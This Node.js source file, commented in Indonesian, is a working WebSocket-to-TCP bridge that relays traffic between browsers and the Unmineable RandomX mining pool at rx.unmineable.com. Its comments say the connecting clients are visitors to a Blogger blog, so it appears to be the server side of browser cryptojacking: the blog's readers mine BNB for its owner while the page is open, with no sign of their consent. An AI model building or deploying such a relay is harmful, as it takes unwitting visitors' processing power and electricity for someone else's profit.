const WebSocket = require('ws');
const net = require('net');

// Menggunakan port dari Render, atau 8080 untuk lokal
const PORT = process.env.PORT || 8080;
const wss = new WebSocket.Server({ port: PORT });

wss.on('connection', (ws) => {
    console.log('Ada pengunjung blog yang terhubung...');

    // Menghubungkan ke Pool Unmineable (Algoritma RandomX)
    const pool = net.connect(3333, 'rx.unmineable.com', () => {
        console.log('Sukses menghubungkan jembatan ke Unmineable BNB!');
    });

    // 1. Oper data dari Browser (Blogger) ke Mining Pool
    ws.on('message', (message) => {
        if (pool.writable) {
            // Mengubah buffer menjadi string dengan aman sebelum dikirim ke pool
            const dataToSend = message.toString().trim();
            pool.write(dataToSend + '\n');
        }
    });

    // 2. Oper balik data dari Mining Pool ke Browser
    pool.on('data', (data) => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(data.toString());
        }
    });

    // 3. PENGAMAN: Penanganan jika koneksi ditutup
    ws.on('close', () => {
        console.log('Pengunjung menutup halaman blog.');
        pool.end();
    });

    pool.on('close', () => {
        console.log('Koneksi dari pool terputus.');
        ws.close();
    });

    // 4. PENGAMAN UTAMA: Cegah Server Crash jika terjadi error jaringan
    ws.on('error', (err) => {
        console.error('WebSocket Error:', err.message);
    });

    pool.on('error', (err) => {
        console.error('Pool TCP Error:', err.message);
    });
});

console.log(`Server Jembatan Proxy Aktif di Port: ${PORT}`);
